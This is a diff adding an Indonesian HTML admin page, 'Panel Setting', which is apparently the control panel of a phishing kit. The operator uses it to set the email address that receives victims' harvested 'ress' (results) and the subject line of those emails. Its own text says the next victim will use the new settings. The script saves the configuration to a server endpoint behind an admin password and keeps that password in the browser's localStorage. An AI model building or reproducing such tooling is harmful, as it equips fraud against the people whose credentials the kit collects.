@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>⚙️ Panel Setting</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh;padding:20px;display:flex;justify-content:center;align-items:center}
+.container{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:28px;max-width:520px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+h1{font-size:20px;text-align:center;margin-bottom:6px}
+.sub{text-align:center;color:#8b949e;font-size:12px;margin-bottom:24px}
+label{display:block;font-size:13px;margin-bottom:6px;color:#c9d1d9;font-weight:500}
+input{width:100%;padding:11px 13px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;outline:none;transition:border .2s}
+input:focus{border-color:#1f6feb}
+.field{margin-bottom:18px}
+button{width:100%;padding:12px;background:#238636;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:background .2s}
+button:hover{background:#2ea043}
+button:disabled{background:#484f58;cursor:not-allowed}
+.status{margin-top:16px;padding:12px;border-radius:8px;font-size:13px;display:none;text-align:center}
+.status.success{display:block;background:#0d2818;color:#3fb950;border:1px solid #238636}
+.status.error{display:block;background:#2d1618;color:#f85149;border:1px solid #f85149}
+.info{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;font-size:12px;color:#8b949e;margin-bottom:20px;line-height:1.6}
+.divider{height:1px;background:#30363d;margin:20px 0}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <h1>⚙️ Panel Setting</h1>
+    <div class="sub">Atur email tujuan & nama ress</div>
+
+    <div class="info">
+        Setiap perubahan <b>langsung tersimpan</b> di server. Korban berikutnya akan pakai setting baru.
+    </div>
+
+    <div class="field">
+        <label>📧 Email Tujuan (Notif Masuk)</label>
+        <input type="email" id="emailTujuan" placeholder="emailkamu@gmail.com">
+    </div>
+
+    <div class="field">
+        <label>🏷️ Nama Ress (Judul Email)</label>
+        <input type="text" id="namaRess" placeholder="RESS KENZO">
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="field">
+        <label>🔑 Password Admin</label>
+        <input type="password" id="adminPass" placeholder="Password untuk simpan">
+    </div>
+
+    <button id="saveBtn" onclick="simpan()">💾 SIMPAN SETTING</button>
+
+    <div class="status" id="status"></div>
+</div>
+
+<script>
+
+const STORAGE_KEY = "kenzo_admin_pass";
+
+window.onload = function(){
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if(saved) document.getElementById("adminPass").value = saved;
+    loadSetting();
+};
+
+async function loadSetting(){
+    try {
+        const r = await fetch("/api/config");
+        const d = await r.json();
+        if(d.email) document.getElementById("emailTujuan").value = d.email;
+        if(d.nama)  document.getElementById("namaRess").value = d.nama;
+    } catch(e){
+        console.log("Gagal load setting:", e);
+    }
+}
+
+async function simpan(){
+    const email = document.getElementById("emailTujuan").value.trim();
+    const nama  = document.getElementById("namaRess").value.trim();
+    const pass  = document.getElementById("adminPass").value;
+
+    const status = document.getElementById("status");
+
+    if(!email || !nama || !pass){
+        status.className = "status error";
+        status.textContent = "❌ Semua field wajib diisi!";
+        return;
+    }
+
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){
+        status.className = "status error";
+        status.textContent = "❌ Format email gak valid!";
+        return;
+    }
+
+    const btn = document.getElementById("saveBtn");
+    btn.disabled = true;
+    btn.textContent = "⏳ Menyimpan...";
+
+    try {
+        const r = await fetch("/api/config", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ password: pass, email: email, nama: nama })
+        });
+
+        const d = await r.json();
+
+        if(d.success){
+            localStorage.setItem(STORAGE_KEY, pass);
+            status.className = "status success";
+            status.textContent = "✅ Setting berhasil disimpan!";
+        } else {
+            status.className = "status error";
+            status.textContent = "❌ " + (d.error || "Gagal simpan");
+        }
+    } catch(e){
+        status.className = "status error";
+        status.textContent = "❌ Error: " + e.message;
+    } finally {
+        btn.disabled = false;
+        btn.textContent = "💾 SIMPAN SETTING";
+    }
+}
+
+</script>
+</body>
+</html>
